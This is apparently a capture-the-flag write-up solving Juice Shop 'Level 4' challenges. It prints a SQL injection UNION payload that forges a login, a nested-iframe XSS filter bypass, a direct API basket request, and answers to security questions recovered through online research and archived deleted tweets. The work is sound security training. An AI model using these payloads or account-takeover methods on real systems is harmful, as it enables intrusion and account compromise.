# Level 4

## Christmas Special (Injection)
_Order the Christmas special offer of 2014._

You can find "Christmas special offer of 2014" in [application-configuration.json](misc/application-configuration.json).
By comparing with the list of products (`GET /api/Product`), you can determine that "Christmas special offer of 2014"
must have product ID `10`.

Knowing the ID, just add it to the cart:
```
POST /api/BasketItems/

{"ProductId":10,"BasketId":"1","quantity":1}
```

Finally, finish the order in your browser. 

## Leaked Unsafe Product (Sensitive Data Exposure)
_Identify an unsafe product that was removed from the shop and inform the shop which ingredients are dangerous._

Similar to the challenge [Christmas Special](#christmas-special-injection), we can easily identify the product in 
[application-configuration.json](misc/application-configuration.json):
```json
{
    "name": "Rippertuer Special Juice",
    "description": "Contains a magical collection of the rarest fruits gathered from all around the world, like Cherymoya Annona cherimola, Jabuticaba Myrciaria cauliflora, Bael Aegle marmelos... and others, at an unbelievable price! <br/><span style=\"color:red;\">This item has been made unavailable because of lack of safety standards.</span>",
    "price": 16.99,
    "image": "undefined.jpg",
    "keywordsForPastebinDataLeakChallenge": [
      "hueteroneel",
      "eurogium edule"
    ]
}
```

Googling for the rarest fruits is not the solution, they are all safe.
So either google for `Rippertuer Special Juice` and find this paste https://pastebin.com/90dUgd7s
or get the answer from `keywordsForPastebinDataLeakChallenge` (guess this is not intentional though).

Submit `Hueteroneel and Eurogium Edule` into _Customer Feedback_ form.

## Ephemeral Accountant (Injection)
_Log in with the (non-existing) accountant acc0unt4nt@juice-sh.op without ever registering that user._

This is about SQL injection into _Login form_. If you already done the [Database Schema](level3.md#database-schema-injection)
challenge, you know the number of columns and data types of `users` table.
 
```
xxx' UNION SELECT 999, '', 'acc0unt4nt@juice-sh.op', 'password', 'accounting', '', '0.0.0.0', '/assets/public/images/uploads/default.svg', '', 1, '2020-08-15T18:22:49.161Z', '2020-08-15T18:22:49.161Z', null; --
```

The role must be the `accounting`!

## Reset Bender's Password (Broken Authentication)
_Reset Bender's password via the Forgot Password mechanism with the original answer to his security question._

Bender's security question is:
> Company you first work for as an adult?

[Bender](https://en.wikipedia.org/wiki/Bender_(Futurama)) is a well-known character from the
TV show [Futurama](https://en.wikipedia.org/wiki/Futurama).

The [wiki](https://en.wikipedia.org/wiki/Bender_(Futurama)) lists his occupations as:
- Suicide booth construction worker (formerly)
- Planet Express Bender / Chef

Read more about [suicide booths](https://futurama.fandom.com/wiki/Suicide_Booth):
> Suicide booths were invented somewhere between 2006 and 2008. Since 2008, America's most important brand of suicide booths is Stop'n'Drop. 

The correct answer is `Stop'n'Drop`

## Reset Uvogin's Password (Sensitive Data Exposure)
_Reset Uvogin's password via the Forgot Password mechanism with the original answer to his security question._

Uvogin's security question is:
> Your favorite movie?

This one is rather hard so let's start with some hints:
> People often reuse aliases online. You might be able to find something by looking online for Uvogin's name or slight variations of it based on his unique writing habits

"Unique writing habits" points to [leetspeak](https://en.wikipedia.org/wiki/Leet).
See that all comments from `Uvogin` are like `y0ur f1r3wall needs m0r3 musc13` or `0 st4rs f0r 7h3 h0rr1bl3 s3cur17y`.

Googling for `uv0gin` quickly reveals his [Twitter account](https://twitter.com/uv0gin).
Unfortunately, nothing useful is here.

The catch is that the important tweet was deleted (_I had no idea and had to look into solutions_).
However, you can recover it with a service such as [Wayback Machine](https://web.archive.org/web/20200403193744/https://twitter.com/uv0gin):

![](images/uv0gin-movie.png)

The correct answer is `Silence of the Lambs`

## Server-side XSS Protection (XSS)
_Perform a persisted XSS attack with <iframe src="javascript:alert(`xss`)"> bypassing a server-side security mechanism._

I tried to use this payload in the _Customer Feedback_ form, but the payload was deleted:
```
Hello <iframe src="javascript:alert(`xss`)"> --> Hello (anonymous)
```

Hopefully, it's just a simple string replacement. So let's try:
```
<<iframe src="javascript:alert(`xss`)">iframe src="javascript:alert(`xss`)">
```

Bingo, the nested `<iframe src="javascript:alert(`xss`)">` string is deleted resulting into the original payload!